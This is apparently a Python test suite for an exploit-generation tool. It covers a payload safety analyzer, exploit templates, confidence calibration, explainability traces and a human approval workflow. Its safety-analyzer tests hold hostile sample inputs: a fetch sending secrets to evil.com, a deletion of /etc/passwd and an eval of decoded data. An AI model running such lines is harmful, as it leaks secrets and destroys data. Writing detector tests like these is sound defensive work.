"""
Tests for AI Components - Group 4

Tests for semantic safety, confidence calibration, explainability, and approval workflow.
"""

import pytest
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch

from ai.semantic_safety import (
    SafetyLevel,
    SafetyCheck,
    SemanticSafetyAnalyzer,
    ExploitTemplateLibrary,
    analyze_payload_safety,
)
from ai.confidence import (
    PredictionRecord,
    CalibrationMetrics,
    ConfidenceCalibrator,
    calibrate_confidence,
)
from ai.explainability import (
    ReasoningStepType,
    ReasoningStep,
    ReasoningTrace,
    ExplainabilityEngine,
)
from ai.approval import (
    ApprovalStatus,
    ApprovalPriority,
    ApprovalRequest,
    ApprovalRule,
    ApprovalWorkflow,
    should_require_approval,
)


class TestSemanticSafetyAnalyzer:
    """Tests for semantic safety analyzer."""
    
    @pytest.fixture
    def analyzer(self):
        return SemanticSafetyAnalyzer()
    
    def test_analyze_safe_payload(self, analyzer):
        payload = "console.log('test');"
        result = analyzer.analyze(payload)
        
        assert result.level in (SafetyLevel.SAFE, SafetyLevel.LOW_RISK)
        assert len(result.issues) == 0
    
    def test_analyze_dangerous_network_payload(self, analyzer):
        payload = "fetch('https://evil.com/steal?data=' + secrets)"
        result = analyzer.analyze(payload)
        
        assert result.score < 1.0
        assert len(result.issues) > 0
        assert any('network' in i.lower() or 'exfiltration' in i.lower() for i in result.issues)
    
    def test_analyze_dangerous_filesystem_payload(self, analyzer):
        payload = "os.remove('/etc/passwd')"
        result = analyzer.analyze(payload)
        
        assert result.level in (SafetyLevel.HIGH_RISK, SafetyLevel.DANGEROUS)
        assert result.score < 0.7
    
    def test_analyze_eval_payload(self, analyzer):
        payload = "eval(user_input)"
        result = analyzer.analyze(payload)
        
        assert result.score < 0.8
        assert any('eval' in i.lower() for i in result.issues)
    
    def test_analyze_with_context(self, analyzer):
        payload = "fetch('https://example.com/api')"
        context = {
            'scope': 'https://example.com/*',
            'target_url': 'https://example.com',
        }
        result = analyzer.analyze(payload, context)
        
        assert isinstance(result, SafetyCheck)
    
    def test_analyze_code_like_payload(self, analyzer):
        payload = """
        function test() {
            const x = 5;
            return x + 1;
        }
        """
        result = analyzer.analyze(payload)
        
        assert isinstance(result, SafetyCheck)
    
    def test_safe_payload_higher_score(self, analyzer):
        safe_payload = "const result = JSON.parse(data); console.log(result);"
        dangerous_payload = "eval(atob(encoded_payload))"
        
        safe_result = analyzer.analyze(safe_payload)
        dangerous_result = analyzer.analyze(dangerous_payload)
        
        assert safe_result.score > dangerous_result.score
    
    def test_to_dict(self, analyzer):
        payload = "console.log('test');"
        result = analyzer.analyze(payload)
        
        data = result.to_dict()
        
        assert 'level' in data
        assert 'passed' in data
        assert 'issues' in data
        assert 'score' in data


class TestExploitTemplateLibrary:
    """Tests for exploit template library."""
    
    def test_list_templates(self):
        templates = ExploitTemplateLibrary.list_templates()
        
        assert 'reentrancy' in templates
        assert 'overflow' in templates
    
    def test_get_template(self):
        template = ExploitTemplateLibrary.get_template('reentrancy')
        
        assert template is not None
        assert 'pattern' in template
        assert 'safety' in template
    
    def test_get_safe_template(self):
        template = ExploitTemplateLibrary.get_safe_template('reentrancy')
        
        assert template is not None
        assert 'console.log' in template
    
    def test_get_nonexistent_template(self):
        template = ExploitTemplateLibrary.get_template('nonexistent')
        
        assert template is None


class TestConfidenceCalibrator:
    """Tests for confidence calibration."""
    
    @pytest.fixture
    def calibrator(self):
        return ConfidenceCalibrator()
    
    def test_record_prediction(self, calibrator):
        record = calibrator.record_prediction(
            prediction_id='pred-001',
            prediction_type='finding',
            confidence=0.85,
            analyzer='slither',
            severity='HIGH',
        )
        
        assert record.id == 'pred-001'
        assert record.predicted_confidence == 0.85
        assert record.actual_outcome is None
    
    def test_resolve_prediction(self, calibrator):
        calibrator.record_prediction(
            prediction_id='pred-002',
            prediction_type='finding',
            confidence=0.9,
            analyzer='mythril',
        )
        
        resolved = calibrator.resolve_prediction('pred-002', outcome=True)
        
        assert resolved is not None
        assert resolved.actual_outcome is True
        assert resolved.resolved_at is not None
    
    def test_calibrate_confidence(self, calibrator):
        raw_confidence = 0.9
        calibrated = calibrator.calibrate_confidence(
            raw_confidence,
            analyzer='slither',
            severity='HIGH',
        )
        
        assert 0.0 <= calibrated <= 1.0
        assert calibrated <= raw_confidence
    
    def test_calibrate_with_unknown_analyzer(self, calibrator):
        calibrated = calibrator.calibrate_confidence(0.8, analyzer='unknown')
        
        assert 0.0 <= calibrated <= 1.0
    
    def test_get_confidence_interval(self, calibrator):
        interval = calibrator.get_confidence_interval(0.85)
        
        assert 'point' in interval
        assert 'lower' in interval
        assert 'upper' in interval
        assert interval['lower'] <= interval['point'] <= interval['upper']
    
    def test_get_uncertainty(self, calibrator):
        low_uncertainty = calibrator.get_uncertainty(0.99)
        high_uncertainty = calibrator.get_uncertainty(0.5)
        
        assert low_uncertainty < high_uncertainty
    
    def test_should_auto_approve(self, calibrator):
        high_confidence = 0.95
        low_confidence = 0.6
        
        assert calibrator.should_auto_approve(high_confidence, threshold=0.9) is True
        assert calibrator.should_auto_approve(low_confidence, threshold=0.9) is False
    
    def test_metrics_updated_after_resolution(self, calibrator):
        for i in range(10):
            calibrator.record_prediction(
                prediction_id=f'pred-{i}',
                prediction_type='finding',
                confidence=0.8,
                analyzer='slither',
            )
            calibrator.resolve_prediction(f'pred-{i}', outcome=True)
        
        metrics = calibrator.get_metrics('slither')
        
        assert metrics is not None
        assert metrics.total_predictions >= 10


class TestExplainabilityEngine:
    """Tests for explainability engine."""
    
    @pytest.fixture
    def engine(self):
        return ExplainabilityEngine()
    
    def test_start_trace(self, engine):
        trace = engine.start_trace(
            decision_type='exploit_generation',
            target='contract.sol',
        )
        
        assert trace.id is not None
        assert trace.decision_type == 'exploit_generation'
        assert trace.target == 'contract.sol'
    
    def test_add_observation(self, engine):
        trace = engine.start_trace('test', 'target')
        step = engine.add_observation(
            trace,
            content='Found reentrancy pattern',
            evidence=['function withdraw()'],
            confidence=0.9,
        )
        
        assert step.step_type == ReasoningStepType.OBSERVATION
        assert 'reentrancy' in step.content
        assert len(step.evidence) == 1
    
    def test_add_hypothesis(self, engine):
        trace = engine.start_trace('test', 'target')
        step = engine.add_hypothesis(
            trace,
            content='Vulnerability is exploitable via reentrancy',
            alternatives=['race condition', 'front-running'],
        )
        
        assert step.step_type == ReasoningStepType.HYPOTHESIS
        assert len(step.alternatives) == 2
    
    def test_add_analysis(self, engine):
        trace = engine.start_trace('test', 'target')
        step = engine.add_analysis(
            trace,
            content='Analyzing call sequence',
            metadata={'calls': 5},
        )
        
        assert step.step_type == ReasoningStepType.ANALYSIS
        assert step.metadata['calls'] == 5
    
    def test_add_decision(self, engine):
        trace = engine.start_trace('test', 'target')
        step = engine.add_decision(
            trace,
            content='Proceed with exploit generation',
            confidence=0.85,
        )
        
        assert step.step_type == ReasoningStepType.DECISION
        assert step.confidence == 0.85
    
    def test_finalize_trace(self, engine):
        trace = engine.start_trace('test', 'target')
        engine.add_observation(trace, 'test observation')
        engine.finalize_trace(trace, 'Exploit generated successfully', 0.9)
        
        assert trace.conclusion == 'Exploit generated successfully'
        assert trace.final_confidence == 0.9
    
    def test_generate_explanation(self, engine):
        trace = engine.start_trace('exploit_generation', 'target')
        engine.add_observation(trace, 'Found vulnerability')
        engine.add_decision(trace, 'Generate exploit', 0.9)
        engine.finalize_trace(trace, 'Done', 0.9)
        
        explanation = engine.generate_explanation(trace)
        
        assert 'exploit_generation' in explanation
        assert 'target' in explanation
    
    def test_generate_verbose_explanation(self, engine):
        trace = engine.start_trace('test', 'target')
        engine.add_observation(trace, 'Observed issue', evidence=['line 42'])
        engine.finalize_trace(trace, 'Done', 0.9)
        
        explanation = engine.generate_explanation(trace, verbosity='verbose')
        
        assert 'Reasoning Steps' in explanation
        assert 'Evidence' in explanation
    
    def test_build_decision_tree(self, engine):
        tree = engine.build_decision_tree('reentrancy', {})
        
        assert tree.question is not None
        assert len(tree.children) > 0
    
    def test_generate_why_explanation(self, engine):
        explanation = engine.generate_why_explanation(
            'reentrancy_strategy',
            {'title': 'Reentrancy', 'severity': 'HIGH'},
        )
        
        assert 'reentrancy' in explanation.lower()
        assert 'HIGH' in explanation


class TestApprovalWorkflow:
    """Tests for approval workflow."""
    
    @pytest.fixture
    def workflow(self):
        return ApprovalWorkflow()
    
    def test_request_approval(self, workflow):
        request = workflow.request_approval(
            action_type='exploit_generation',
            description='Generate exploit for reentrancy',
            context={'finding_id': 'finding-001'},
            confidence=0.7,
            requester='user-001',
        )
        
        assert request is not None
        assert request.status == ApprovalStatus.PENDING
        assert request.action_type == 'exploit_generation'
    
    def test_high_confidence_auto_approve(self, workflow):
        request = workflow.request_approval(
            action_type='exploit_generation',
            description='High confidence finding',
            context={},
            confidence=0.95,
        )
        
        assert request is None
    
    def test_approve_request(self, workflow):
        request = workflow.request_approval(
            action_type='exploit_execution',
            description='Execute exploit',
            context={},
            confidence=0.5,
        )
        
        approved = workflow.approve(request.id, 'admin-001', 'Looks safe')
        
        assert approved.status == ApprovalStatus.APPROVED
        assert approved.approver == 'admin-001'
    
    def test_reject_request(self, workflow):
        request = workflow.request_approval(
            action_type='exploit_execution',
            description='Execute exploit',
            context={},
            confidence=0.3,
        )
        
        rejected = workflow.reject(request.id, 'admin-001', 'Too risky')
        
        assert rejected.status == ApprovalStatus.REJECTED
        assert 'risky' in rejected.reason.lower()
    
    def test_cancel_request(self, workflow):
        request = workflow.request_approval(
            action_type='exploit_generation',
            description='Test',
            context={},
            confidence=0.5,
        )
        
        cancelled = workflow.cancel(request.id)
        
        assert cancelled.status == ApprovalStatus.CANCELLED
    
    def test_admin_override(self, workflow):
        request = workflow.request_approval(
            action_type='exploit_execution',
            description='Test',
            context={},
            confidence=0.3,
        )
        
        overridden = workflow.override(request.id, 'super-admin', True, 'Critical deadline')
        
        assert overridden.status == ApprovalStatus.APPROVED
        assert 'OVERRIDE' in overridden.reason
    
    def test_get_pending_requests(self, workflow):
        workflow.request_approval('exploit_generation', 'Test 1', {}, 0.5)
        workflow.request_approval('exploit_generation', 'Test 2', {}, 0.4)
        
        pending = workflow.get_pending()
        
        assert len(pending) >= 2
    
    def test_request_expiration(self):
        workflow = ApprovalWorkflow(default_timeout_minutes=-1)
        
        request = workflow.request_approval(
            action_type='exploit_generation',
            description='Test',
            context={},
            confidence=0.3,
            expires_in_minutes=-1,
        )
        
        expired = workflow.check_expired()
        
        assert len(expired) >= 1
    
    def test_should_require_approval(self):
        assert should_require_approval('exploit_execution', 0.5) is True
        assert should_require_approval('exploit_execution', 1.0) is False


class TestCalibrationMetrics:
    """Tests for calibration metrics."""
    
    def test_precision_calculation(self):
        metrics = CalibrationMetrics(
            source='test',
            true_positives=8,
            false_positives=2,
        )
        
        assert metrics.precision == 0.8
    
    def test_recall_calculation(self):
        metrics = CalibrationMetrics(
            source='test',
            true_positives=8,
            false_negatives=2,
        )
        
        assert metrics.recall == 0.8
    
    def test_f1_score_calculation(self):
        metrics = CalibrationMetrics(
            source='test',
            true_positives=8,
            false_positives=2,
            false_negatives=2,
        )
        
        assert metrics.f1_score == pytest.approx(0.8, rel=0.1)
    
    def test_accuracy_calculation(self):
        metrics = CalibrationMetrics(
            source='test',
            total_predictions=100,
            true_positives=80,
            true_negatives=10,
        )
        
        assert metrics.accuracy == 0.9
    
    def test_to_dict(self):
        metrics = CalibrationMetrics(source='test')
        data = metrics.to_dict()
        
        assert 'source' in data
        assert 'precision' in data
        assert 'recall' in data
